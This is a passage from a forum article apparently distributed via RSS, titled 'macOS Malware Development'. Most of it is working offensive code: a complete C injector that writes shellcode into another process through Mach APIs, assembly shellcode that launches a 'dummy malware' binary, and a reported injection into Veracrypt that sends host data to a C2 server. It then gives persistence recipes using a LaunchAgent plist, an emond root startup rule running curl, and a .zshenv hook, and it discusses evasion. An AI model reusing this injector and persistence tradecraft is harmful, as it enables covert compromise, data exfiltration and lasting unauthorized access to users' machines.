<p>But does the <code>shellcode</code> work? To ensure its functionality, we should test whether we can perform a simple injection. One way to do this is by compiling the <code>shellcode</code> and storing it as a global variable within the executable’s <code>__TEXT,__text</code> section. We can achieve this by declaring the <code>shellcode</code> as a variable within the code itself. Here’s a simple example:</p>
<pre><code class="lang-c">const char output[] __attribute__((section("__TEXT,__text"))) =  "
\xeb\x1e\x5e\xb8\x04\x00\x00\x02\xbf\x01
\x00\x00\x00\xba\x0e\x00\x00\x00\x0f\x05
\xb8\x01\x00\x00\x02\xbf\x00\x00\x00\x00
\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c
\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0d\x0a";

typedef int (*funcPtr)();

int main(int argc, char **argv)
{
    funcPtr ret = (funcPtr) output;
    (*ret)();

    return 0;
}
</code></pre>
<p>Alright, now that we have the <code>shellcode</code>, let’s start writing the actual injector. The <code>main</code> function seems like the natural starting point. The logic is simple: we take a single command-line argument, which should be the process ID (PID) of the target process to inject the shellcode into. Then, we obtain a handle to our task using <code>task_for_pid()</code>. Next, we’ll allocate a memory buffer in the remote task with <code>mach_vm_allocate()</code>. After that, we’ll write our shellcode to the remote buffer with <code>mach_vm_write()</code>. We’ll modify the memory permissions of the remote buffer with <code>mach_vm_protect()</code>. Then, we’ll update the remote thread context to point to the start of the shellcode with <code>thread_create_running()</code>. Finally, we’ll run our shellcode, which will print “Hello World”.</p>
<p>Remember our earlier discussion about the differences between a Mach task thread and a BSD pthread, and the <code>task_for_pid()</code> API call. In order to develop a utility that utilizes <code>task_for_pid()</code>, you’ll need to create an <code>Info.plist</code> file. This file will be embedded into your executable and will enable code signing with the key set to “allow”. Below is an example of the Info.plist:</p>
<pre><code class="lang-c">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;com.apple.security.get-task-allow&lt;/key&gt;
&lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</code></pre>
<p>Note:** not all sections of a program’s virtual memory permit their contents to be interpreted as code by the CPU (i.e., “marked executable”). Memory can be marked as readable (R), writable (W), executable (E), or some combination of the three. For instance, a page marked RW means one can read/write to these addresses in memory, but their contents may not be treated as executable by the CPU. This is a crucial aspect of memory protection and security in modern operating systems.</p>
<p>Executable memory regions are typically marked with the execute (E) permission, allowing the CPU to interpret the contents of these regions as machine instructions and execute them. This is essential for running programs, as the CPU needs to fetch instructions from memory and execute them.</p>
<p>However, allowing arbitrary memory regions to be executable can pose significant security risks, such as buffer overflow attacks or injection of malicious code. Therefore, modern operating systems employ memory protection mechanisms to restrict the execution of code to specific, authorized regions of memory.</p>
<p>By controlling the permissions of memory pages, operating systems can enforce security policies and prevent unauthorized execution of code. For example, writable memory regions that contain data should not be executable to prevent the execution of injected malicious code. Conversely, executable code should not be writable to prevent tampering with the program’s instructions.</p>
<p>Alright, the entry point we converts the PID provided as a string to an integer and calls the <code>inject_shellcode</code> function to inject the shellcode into the target process using the provided PID,</p>
<p>We need to interact with the target process, so we declare a few variables to hold essential information. These include <code>remote_task</code> to represent the task port of the target process, <code>remote_stack</code> to store the address of the allocated memory for the remote stack within the target process, and <code>shellcode_region</code> to keep track of the memory region allocated for the shellcode.</p>
<p>Now, the process begins. We need to get permission to access the target process, so we use the <code>task_for_pid</code> function to obtain the task port. This allows us to manipulate the memory and threads of the target process.</p>
<p>With access granted, we proceed to allocate memory within the target process. We reserve space for both the remote stack and the shellcode using <code>mach_vm_allocate</code>. This ensures that we have a place to execute our code, Once memory is allocated, we write our shellcode into the allocated memory space of the target process using <code>mach_vm_write</code>. This effectively places our code where it needs to be executed.</p>
<pre><code class="lang-c">int inject_shellcode(pid_t pid, unsigned char *shellcode, size_t shellcode_size) {
    task_t remote_task;
    mach_vm_address_t remote_stack = 0;
    vm_region_t shellcode_region;
    mach_error_t kr;

    // Get the task port for the target process
    kr = task_for_pid(mach_task_self(), pid, &amp;remote_task);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to get the task port for the target process: %s\n", mach_error_string(kr));
        return -1;
    }

    // Allocate memory for the stack in the target process
    kr = mach_vm_allocate(remote_task, &amp;remote_stack, STACK_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to allocate memory for remote stack: %s\n", mach_error_string(kr));
        return -1;
    }

    // Allocate memory for the shellcode in the target process
    kr = mach_vm_allocate(remote_task, &amp;shellcode_region.addr, shellcode_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to allocate memory for remote code: %s\n", mach_error_string(kr));
        return -1;
    }
    shellcode_region.size = shellcode_size;
    shellcode_region.prot = VM_PROT_READ | VM_PROT_EXECUTE;

    // Write the shellcode to the allocated memory in the target process
    kr = mach_vm_write(remote_task, shellcode_region.addr, (vm_offset_t)shellcode, shellcode_size);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to write shellcode to remote process: %s\n", mach_error_string(kr));
        return -1;
    }

    // Adjust memory permissions for the shellcode
    kr = vm_protect(remote_task, shellcode_region.addr, shellcode_region.size, FALSE, shellcode_region.prot);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to set memory permissions for remote code: %s\n", mach_error_string(kr));
        return -1;
    }

    // Create a remote thread to execute the shellcode
    x86_thread_state64_t thread_state;
    memset(&amp;thread_state, 0, sizeof(thread_state));
    thread_state.__rip = (uint64_t)shellcode_region.addr;
    thread_state.__rsp = (uint64_t)(remote_stack + STACK_SIZE);

    thread_act_t remote_thread;
    kr = thread_create(remote_task, &amp;remote_thread);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to create remote thread: %s\n", mach_error_string(kr));
        return -1;
    }

    // Set the thread state
    kr = thread_set_state(remote_thread, x86_THREAD_STATE64, (thread_state_t)&amp;thread_state, x86_THREAD_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to set thread state: %s\n", mach_error_string(kr));
        return -1;
    }

    // Resume the remote thread
    kr = thread_resume(remote_thread);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to resume remote thread: %s\n", mach_error_string(kr));
        return -1;
    }

    printf("Shellcode injected successfully!\n");

    mach_port_deallocate(mach_task_self(), remote_thread);

    return 0;
}
</code></pre>
<p>To ensure that our shellcode can run, we modify the memory permissions of the allocated memory region containing the shellcode. We use <code>vm_protect</code> to set the appropriate permissions, allowing for execution. Now, it’s time to execute our shellcode. We create a remote thread within the target process using <code>thread_create</code>. This thread will be responsible for running our injected code.</p>
<p>Before we start the thread, we need to set its state. We prepare the thread to execute our shellcode by setting the instruction pointer (<code>rip</code>) to the starting address of the shellcode and the stack pointer (<code>rsp</code>) to the allocated remote stack. Finally, we’re ready to execute our shellcode. We resume the remote thread using <code>thread_resume</code>, allowing it to begin executing the injected code.</p>
<p>If everything goes smoothly, we print a success message indicating that the shellcode was injected successfully. We also clean up any resources used during the injection process by deallocating Mach ports. And that’s it! The entire process of injecting shellcode into a target process on macOS using Mach APIs.</p>
<p>In our injector, we’re injecting shellcode into a target process using Mach APIs in macOS. Now, one significant difference between POSIX threads and Mach threads comes into play here.<br>
POSIX threads utilize the thread local storage (TLS) data structure, which is crucial for managing thread-specific data. However, Mach threads don’t have this concept of TLS.</p>
<p>Now, when we inject our shellcode into the target process and create a remote thread to execute it, we can’t simply point the instruction pointer in the thread context struct and expect everything to work smoothly. Why? Because our shellcode, which is essentially unmanaged code, needs to run in a controlled environment, and transitioning from a Mach thread directly to executing our shellcode might cause issues.</p>
<p>So, to prevent potential crashes or errors, we need to ensure that our shellcode is executed within the context of a fully-fledged POSIX thread. This means that as part of our injection process, we have to somehow promote our shellcode from being executed within the context of a base Mach thread to being executed within the context of a POSIX thread. By doing this, we create a more stable environment for our shellcode to execute, ensuring that when the target process resumes its execution at the start of our shellcode, it does so without any issues. This promotion process is essential for the successful execution of our injected shellcode in user mode without causing crashes or unexpected behavior.</p>
<p>As you can see, we injected our <code>shellcode</code> into the <code>Veracrypt</code> process successfully. The message “Hello World!” was printed, confirming that the shellcode executed as expected and produced the desired output.</p>
<p><img src="https://0xf00sec.github.io/images/IMG5.png" width="690" height="273"> </p>
<p>However, let’s shift our focus now. Remember the code we previously developed to transmit system data to the C2 server? What if we inject shellcode into the Veracrypt process to execute our dummy malware, enabling it to establish communication with the C2 server and transmit host data?</p>
<p>To execute a shell command, considering I’m running zsh, we need to trigger a syscall to run <code>/bin/zsh -c</code>. For this, we need to utilize <code>execve</code>. What does this do? Simply put, it executes the program referenced by <code>_pathname</code>, which in our case will be the path to our dummy malware executable.</p>
<p>Alright, let’s proceed by writing a simple assembly code to execute <code>/bin/zsh -c '/Users/foo/dummy'</code>. First, we’ll set up a register (<code>rbx</code>) and load the string <code>'/bin/zsh'</code> into it. Once this string is pushed onto the stack, we’ll proceed to load the ASCII values for <code>-c</code> into the lower 16 bits of the <code>rax</code> register. After pushing this <code>-c</code> flag onto the stack, we’ll set the <code>rbx</code> register to point to the <code>-c</code> flag on the stack, as it will be necessary later during the syscall preparation.</p>
<p>Any additional details will be described in comments within the code. At the end of this section, there’s an indirect jump facilitating the execution of subsequent instructions. This jump redirects the program flow to the address stored in the <code>exec</code> subroutine, ensuring the continuity of execution.</p>
<pre><code class="lang-c">global _main

_main:
    xor rdx, rdx        ; Clear rdx register
    push rdx            ; Push NULL onto stack (String terminator)
    mov rbx, '/bin/zsh' ; Load '/bin/zsh' into rbx
    push rbx            ; Push '/bin/zsh' onto stack
    mov rdi, rsp        ; Set rdi to point to '/bin/zsh\0'
    xor rax, rax        ; Clear rax register
    mov ax, 0x632D      ; Load "-c" into lower 16 bits of rax
    push rax            ; Push "-c" onto stack
    mov rbx, rsp        ; Set rbx to point to "-c"
    push rdx            ; Push NULL onto stack
    jmp short dummy     ; Jump to label dummy

exec:
    push rbx            ; Push "-c" onto stack
    push rdi            ; Push '/bin/zsh' onto stack
    mov rsi, rsp        ; Set RSI to point to stack
    push 59             ; Push syscall number
    pop rax             ; Pop syscall number into rax
    bts rax, 25         ; Set 25th bit of rax (AT_FDCWD flag)
    syscall             ; Invoke syscall

dummy:
    call exec                   ; Call subroutine exec
    db '/Users/foo/dummy_m', 0  ; Define string
    push rdx                    ; Push NULL onto stack
</code></pre>
<p>Alright, it’s time to try this beauty. As usual, we’ll need to extract the shellcode and test it before using it. And just like that, bingo! We’ve successfully injected our shellcode, triggering our dummy malware. We’re now receiving host information in the C2 server. We can push this further by exploring additional capabilities and attack vectors, even achieve persistence, but I think that’s enough for now.</p>
<p><img src="https://0xf00sec.github.io/images/IMG6.png" width="690" height="353"> </p>
<p>Executing and sending host information essentially does nothing harmful to your computer. “Dummy” is more about demonstrating how malware can be triggered and how it uses injection techniques to spread. It’s also interesting for defensive evasion or adding backdoor capabilities. This was just a quick look at the Mach API, covering system calls and code injection techniques, and how an attacker can utilize something like process injection to achieve malicious behavior. In this example, we’ve used a legitimate process to inject and execute “malicious code,” potentially exposing host data to an attacker. This can be pushed further, but we’re here just to learn, and I encourage you to experiment with caution. Code injection must be used with care.</p>
<p>I hope you’ve learned something from this simple introduction, and there’s a lot more to explore beyond what we’ve touched on here. All the code used here can be found at <a href="https://github.com/0xf00sec/OSX-Injection" rel="noopener nofollow ugc">Github</a></p>
<h1><a name="persistence-11" class="anchor" href="https://0x00sec.org#persistence-11"></a>Persistence</h1>
<p>Alright, let’s discuss <em>persistence</em>. It’s a crucial step once we’ve gained initial access and understood the situation. Typically, we aim to establish some form of persistence. We don’t want to rely solely on that initial access point because it could be terminated for various reasons. There might be issues with the user’s computer, or the target could decide to shut everything down. So, it’s important to have a method in place to maintain access to the target.</p>
<p>While there are several persistence techniques for MacOS systems, many of them require root privileges to perform, or exploit some sort of low-level vulnerability to escalate. To keep things simple, let’s focus on Userland Persistence. First, I’ll describe some well-known persistence techniques and some lesser-known ones, so you can understand how these techniques work and how malware can use them. Alright, let’s go :</p>
<p>Before I began writing this article, I analyzed some samples targeting macOS and read some threat reports. One commonality among them is that launch agents and launch daemons are by far the most prevalent methods of persistence. Why, you might ask? Well, it’s because of their simplicity and flexibility. You could liken them to the startup folder persistence equivalent on Windows. However, detecting such techniques is relatively easy. Remember when we mentioned LOLBins? Well, think of it as a similarly straightforward and common method, and the detection methods are also well-known.</p>
<h2><a name="launchagent-launchdaemon-12" class="anchor" href="https://0x00sec.org#launchagent-launchdaemon-12"></a>LaunchAgent &amp; LaunchDaemon</h2>
<p>LaunchAgents and LaunchDaemons are key components of macOS, responsible for managing processes automatically. LaunchAgents are typically located in the <code>~/Library/LaunchAgents</code> directory for user-specific tasks, triggering actions when a user logs in. On the flip side, LaunchDaemons are situated in <code>/Library/LaunchDaemons</code>, initiating tasks upon system startup.</p>
<p>Although LaunchAgents primarily operate within user sessions, they can also be found in system directories like <code>/System/Library/LaunchAgents</code>. However, modifying these files would require disabling System Integrity Protection (SIP), which is not recommended due to potential security risks. In contrast, LaunchDaemons, operating at a system level, require administrator privileges for installation and typically reside in <code>/Library/LaunchDaemons</code>.</p>
<p>Both LaunchAgents and LaunchDaemons are configured using <code>.plist</code> files, specifying commands or referencing executable files for execution.</p>
<p>LaunchAgents are suitable for tasks requiring user interaction, while LaunchDaemons are better suited for background processes. Let’s take a LaunchAgents example:</p>
<pre><code class="lang-auto">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
    &lt;key&gt;Label&lt;/key&gt;
    &lt;string&gt;com.pre.foo.plist&lt;/string&gt;
    &lt;key&gt;ProgramArguments&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;/Users/foo/dummy&lt;/string&gt;
    &lt;/array&gt;
    &lt;key&gt;RunAtLoad&lt;/key&gt;
    &lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</code></pre>
<p>So, what does this all mean? Basically, when we want our binary to run every time a user logs onto the system, we just tell launchd to handle it. It’s pretty straightforward, right? But here’s where it gets interesting: there’s something called <code>emond</code>, a command native to macOS located at <code>/sbin/emond</code>. This little tool is quite handy; it accepts events from various services, processes them through a simple rules engine, and takes action accordingly. These actions can involve running commands or performing other tasks.</p>
<p>Now, <code>emond</code> isn’t just any ordinary command. It functions as a regular daemon and is kicked off by launchd every time the operating system starts up. Its configuration file, where we set when and how <code>emond</code> runs, hangs out with the other system daemons at <code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.</p>
<p>But how can we use this event monitoring daemon to establish persistence? Well, the mechanics of <code>emond</code> are pretty much like any other LaunchDaemon. It’s launchd’s job to fire up all the LaunchDaemons and LaunchAgents during the boot process. Since <code>emond</code> starts up during boot, if you’re using the <code>_run command_</code> action, you need to be mindful of what command you’re executing and when during the boot process it’ll happen.</p>
<pre><code class="lang-c">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;array&gt;
    &lt;dict&gt;
        &lt;key&gt;name&lt;/key&gt;
        &lt;string&gt;foo&lt;/string&gt;
        &lt;key&gt;enabled&lt;/key&gt;
        &lt;true/&gt;
        &lt;key&gt;eventTypes&lt;/key&gt;
        &lt;array&gt;
            &lt;string&gt;startup&lt;/string&gt;
        &lt;/array&gt;
        &lt;key&gt;actions&lt;/key&gt;
        &lt;array&gt;
            &lt;dict&gt;
                &lt;key&gt;command&lt;/key&gt;
                &lt;string&gt;sleep&lt;/string&gt;
                &lt;key&gt;user&lt;/key&gt;
                &lt;string&gt;root&lt;/string&gt;
                &lt;key&gt;arguments&lt;/key&gt;
                &lt;array&gt;
                    &lt;string&gt;10&lt;/string&gt;
                &lt;/array&gt;
                &lt;key&gt;type&lt;/key&gt;
                &lt;string&gt;RunCommand&lt;/string&gt;
            &lt;/dict&gt;
            &lt;dict&gt;
                &lt;key&gt;command&lt;/key&gt;
                &lt;string&gt;curl&lt;/string&gt;
                &lt;key&gt;user&lt;/key&gt;
                &lt;string&gt;root&lt;/string&gt;
                &lt;key&gt;arguments&lt;/key&gt;
                &lt;array&gt;
                    &lt;string&gt;dns.log&lt;/string&gt;
                &lt;/array&gt;
                &lt;key&gt;type&lt;/key&gt;
                &lt;string&gt;RunCommand&lt;/string&gt;
            &lt;/dict&gt;
        &lt;/array&gt;
    &lt;/dict&gt;
&lt;/array&gt;
&lt;/plist&gt;
</code></pre>
<p>So, in our <strong>SampleRules.plist</strong> file, we have a setup called ‘foo’. First off, it waits for 10 seconds after startup. This is done using a command called <code>sleep</code>. Next, we use <code>curl</code> to simply send a DNS query record to verify that it’s actually working, and once the service has started, your event will immediately fire and trigger any actions. <code>emond</code> isn’t a new way to monitor events on macOS, but it’s considered innovative when used for offensive purposes.</p>
<h2><a name="bash-profiles-zsh-startup-13" class="anchor" href="https://0x00sec.org#bash-profiles-zsh-startup-13"></a>Bash Profiles &amp; Zsh Startup</h2>
<p>Let’s talk about those bash profiles on Linux systems. They’re essentially scripts containing commands that run whenever you open up a terminal, Instead of bash profiles, zsh has its own version called start files, which serve the same purpose. But here’s the twist: zsh also comes with an extra file called the zsh environment file. This file is more powerful because it kicks in more often, ensuring persistence across different interactions with zsh.</p>
<p>The cool thing is that even if you just type in a command like <code>zsh -c</code>, this shell environment file still gets sourced. This means your persistence setup remains strong, no matter how you’re using shell.</p>
<pre><code class="lang-sh">~ &gt; cat .zshenv
. "/Users/foo/startup.sh" &gt; /dev/null 2&gt;&amp;1&amp;
</code></pre>
<p>Now, every time you open a terminal and Z shell initializes, it will automatically execute the <code>startup.sh</code> script, ensuring that your desired commands or actions are performed consistently.</p>
<p><img src="https://0xf00sec.github.io/images/IMG7.png" width="592" height="257"> </p>
<p>Now, to execute it in the background, we use <code>setopt NO_MONITOR</code>. This command disables job monitoring and then runs the <code>startup.sh</code> script in the background. As a result, the script runs every time you open a terminal with Z shell, but it runs silently in the background.</p>
<p>So, you get the gist of it, right? These are some of the known techniques I’ve come across, especially in samples. There’s more like Cron jobs, Dock shortcuts, and more. But to be honest, if I were to write specifically for macOS, I’d go multi-stage and avoid any known techniques out there. Simply put, once a technique is made public, it’s burned. So , I’ll focus more on developing something that has a longer lifespan.</p>
<p>Nowadays, with all the public scripts and post-exploitation frameworks out there, attackers try to get the job done easily without wasting time or energy. Writing malware takes time and energy, so they aim for low-hanging fruit that’s just acceptable for a malware author. Because once the malware is burned, it’s burned. But if it’s a long-term operation, it takes time and skill to put together, and you can’t risk the malware getting burned by the first few infection. But for a red team exercise, for example, you’d test low-hanging fruit and an easy way to get in before emulating advance threats.</p>
<p>Also, a skilled attacker can get past most security setups with just a simple MSFvenom shellcode. Yep, so at the end, it comes down to the simplest attacks. Usually, at this point in the article, I’ve added a section for writing a simple malware, where we take all that we’ve covered and put it into one malware(rootkit). However, considering some thought, adding more code might just make things drag on and get confusing. We can save that for another article where we can really dive into the whole process because rootkits are quite advanced pieces of code and require knowledge about the kernel and low-level system programming. Since we just covered the surface here, I don’t think a rootkit would be a match for this article; it needs its own article.</p>
<p>But hey, since we’ve already covered code injection pretty extensively, we’ll get into the fancy stuff later.</p>
<h1><a name="conclusion-14" class="anchor" href="https://0x00sec.org#conclusion-14"></a>Conclusion</h1>
<p>In conclusion, I hope that you’ve enjoyed and learned something from this article. We’ve covered a broad array of topics related to the macOS architecture and API, although we’ve only scratched the surface. By delving into techniques and writing simple code using the Mach API, we’ve gained a deeper understanding of the environment, its features, and its security. We’ve covered fundamental concepts like code injection and simple persistence techniques, and we’ve even seen macOS syscalls in action through examples. Until next time.</p>
<h2><a name="references-15" class="anchor" href="https://0x00sec.org#references-15"></a>References</h2>
<ul>
<li><a href="https://developer.apple.com/library/archive/documentation/DeviceDrivers/Conceptual/WritingDeviceDriver/IOService/IOService.html#//apple_ref/doc/uid/TP30000697-TPXREF101" rel="noopener nofollow ugc">I/O Kit Fundamentals</a></li>
<li><a href="https://developer.apple.com/library/archive/navigation/#section=Platforms&amp;topic=macOS" rel="noopener nofollow ugc">macOS - Apple Developer</a></li>
<li><a href="https://knight.sc/malware/2019/03/15/code-injection-on-macos.html" rel="noopener nofollow ugc">Code Injection on macOS</a></li>
<li><a href="https://blog.timac.org/2012/1218-simple-code-injection-using-dyld_insert_libraries/" rel="noopener nofollow ugc">Simple Code Injection</a></li>
<li><a href="http://www.idryman.org/blog/2014/12/02/writing-64-bit-assembly-on-mac-os-x/" rel="noopener nofollow ugc">Writing 64-bit Assembly on Mac OS X</a></li>
<li><a href="https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/KernelProgramming/Architecture/Architecture.html#//apple_ref/doc/uid/TP30000905-CH1g-CACDAEDC" rel="noopener nofollow ugc">Architecture of the Kernel - Darwin</a></li>
</ul>
          <p><a href="https://0x00sec.org/t/macos-malware-development/39443/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/macos-malware-development/39443/1</link>
        <pubDate>Sat, 09 Mar 2024 02:01:53 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-39443-1</guid>
        <source url="https://0x00sec.org/t/macos-malware-development/39443.rss">macOS Malware Development</source>
      </item>
  </channel>
</rss>
